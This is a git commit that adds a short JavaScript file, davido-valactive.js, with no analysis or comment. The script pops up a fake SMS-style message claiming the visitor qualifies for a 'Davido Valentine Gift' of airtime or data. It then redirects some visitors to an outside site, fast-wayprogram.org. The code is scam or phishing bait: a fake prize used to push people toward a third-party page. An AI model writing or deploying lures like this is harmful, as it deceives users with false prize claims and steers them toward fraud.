4a71abcf407e2bfa54022a5d4df6210ac6a64397
superblog1 <imohette4@gmail.com>
2025-02-10 13:42:46 +0100

    Create davido-valactive.js

---
+++ davido-valactive.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE AIRTIME/DATA'
+password=prompt('SMS: Congratulations You are qualify for Davido Valentine Gift, Kindly Press OK to get gift now   ','ACTIVATE AIRTIME/DATA');
+if (password != 'ACTIVATE AIRTIME/DATA') {
+location.href='https://fast-wayprogram.org/davido.html';
+}
